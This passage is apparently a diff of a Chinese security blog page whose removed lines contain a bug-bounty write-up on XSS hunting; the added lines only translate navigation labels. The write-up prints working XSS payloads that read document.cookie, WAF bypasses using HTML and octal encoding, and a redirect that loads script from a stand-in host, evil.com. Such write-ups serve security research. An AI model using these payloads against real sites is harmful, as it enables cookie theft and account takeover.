-<p>不过只要脱离引号就好说，毕竟有很多JS事件可以调。一开始把眼光放在了input标签上测试了一些on事件，发现type是hidden，一些可视on事件都没用的。记得之前看过一个input hidden xss的一个用法是按alt+shift+x触发，poc如下</p>
-<pre><code>urlencode(email=&amp;#34/accesskey=&amp;#34X&amp;#34/onclick=&amp;#34alert&amp;#40&#39;xss&#39;&amp;#41&amp;#34@qq.com)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad17de9c-5679-1.png" alt="image_1d6vfebe9k0q1704vhff8u16cq2q.png-39kB"></p>
-<p>但是这个poc很鸡肋。因为要打出cookie的话长度受限，且利用条件苛刻(firefox+按键)</p>
-<p>回头看了下发现有form标签也有输出点，最初以为form能执行的JS事件就只有reset和submit，后来测试跑onmounseover也能弹框。</p>
-<pre><code>encodeurl(email=&amp;#34/onmouseover=&amp;#34alert&amp;#40document.cookie&amp;#41&amp;#34@qq.com)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad29e16e-5679-1.png" alt="image_1d71n2s5m1mnpvbslfj1iatkg99e.png-70.9kB"></p>
-<h1 id="一个受阻的XSS"><a href="#一个受阻的XSS" class="headerlink" title="一个受阻的XSS"></a>一个受阻的XSS</h1><p>在测试某业务时发现一个有趣的参数拼接点：</p>
-<p>iframe的src拼接url参数+后端给定的第三方host-&gt;iframe加载src</p>
-<p>测试了一下特殊字符都给实体化了，但是又舍不得一个iframe<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad3e1f30-5679-1.png" alt="image_1d6vl16bn14i9ihun3ovnvnd4k.png-187.5kB"></p>
-<p>经过一番寻找，发现第三方服务的登陆点存在JS跳转漏洞，用iframe加载这个第三方服务的dom-xss也能造成弹框效果<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad523f1a-5679-1.png" alt="image_1d6vleeqr1r4613u81e81cja1m3h5h.png-106.4kB"></p>
-<p>虽然是在SRC业务站点弹的框，但真正的域应该是子页面的。打印一下COOKIE验证，果然是子页面域的cookie。由于waf掉了document.cookie和javascript:alert，我用了html编码的’:’和八进制js编码的’.’绕过，完整打印子页面域payload如下</p>
-<pre><code>https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(document\56cookie)</code></pre><p>在进一步的探索中，我做了两个尝试：</p>
-<ol>
-<li>尝试跳一个外域的JS，看能不能把src属性转到这个js<pre><code>https://src.com?url=redirect_uri%3Dhttps://evil.com/xss.js</code></pre>但是会把资源解析到子页面的document里，而不是src的改变<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad63994a-5679-1.png" alt="image_1d6vm2dvb1ls2185k1hof58miho5u.png-128.4kB"></li>
-</ol>
-<ol start="2">
-<li>iframe是否能调用父页面的事件呢(document)？如果可以的话我们就直接调js uri把cookie打出去。之所以有这个想法是因为，当时寻思既然站点调用这个三方服务了，很大可能性这个三方站是iframe-src白名单。不过测试后发现依然被跨域限制，测试payload<pre><code>https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(window.parent.document\56cookie)</code></pre><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad6accec-5679-1.png" alt="image_1d6fi5odbg1pnb7nfdgs7ji6p.png-13.7kB"></li>
-</ol>
-<p>对跨域姿势了解的不多，如果有兴趣的师傅，可以一起来交流一下这种问题</p>
-<h1 id="自闭总结"><a href="#自闭总结" class="headerlink" title="自闭总结"></a>自闭总结</h1><p>从打ctf到学着去挖洞，还是有一些思维出入的地方，慢慢理解之前师傅们说的资产收集的重要性。</p>
-<p>也特别感谢引路人鬼麦子师傅给予的帮助，这里顺便推荐麦子师傅基于爬虫的一款开源子域名监控工具<a href="https://github.com/guimaizi/get_domain" target="_blank" rel="noopener">get_domain</a>，在搭建过程中如果遇到环境配置问题，可以参考这篇<a href="http://hpdoger.me/2019/03/30/Ubuntu16.04%E6%90%AD%E5%BB%BA%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7%E6%9C%8D%E5%8A%A1Get_domain/" target="_blank" rel="noopener">Ubuntu16.04-Get_domain搭建手册</a></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2019/04/05/SRC挖掘初探之随缘XSS挖掘/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1171,7 +1535,7 @@ imglist=%2Cpicture%2F2019%2F02%2F22%2F_a948b4eeaca7420cad9d54fdb0331230.jpg&amp;
 </section>
 
   <nav class="page-nav">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
   </nav>
 
     </main>
